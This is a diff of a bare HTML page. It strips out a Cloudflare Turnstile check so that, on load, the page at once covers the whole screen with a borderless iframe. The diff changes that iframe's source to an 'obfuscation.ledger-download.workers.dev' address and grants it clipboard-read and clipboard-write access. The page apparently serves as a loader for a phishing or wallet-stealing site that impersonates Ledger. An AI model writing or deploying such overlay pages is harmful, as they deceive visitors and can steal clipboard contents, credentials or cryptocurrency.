@@ -2,7 +2,6 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
   <style>
     html,
@@ -20,16 +19,9 @@
   </style>
 <body>
 
-  <div
-    class="cf-turnstile"
-    data-sitekey="0x4AAAAAAE6CW1sbm5pwczTW"
-    data-callback="onHumanVerified">
-  </div>
-
   <script>
-    function onHumanVerified() {
       const iframe = document.createElement('iframe');
-      iframe.src = 'https://inside.fgifgoidjiosfjdsf.workers.dev/';
+      iframe.src = 'https://obfuscation.ledger-download.workers.dev/';
       iframe.allow = 'clipboard-read; clipboard-write; fullscreen';
       iframe.style.position = 'fixed';
       iframe.style.inset = '0px';
@@ -37,7 +29,6 @@
       iframe.style.height = '100vh';
       iframe.style.border = '0px';
       document.body.appendChild(iframe);
-    }
   </script>
 
 </body>
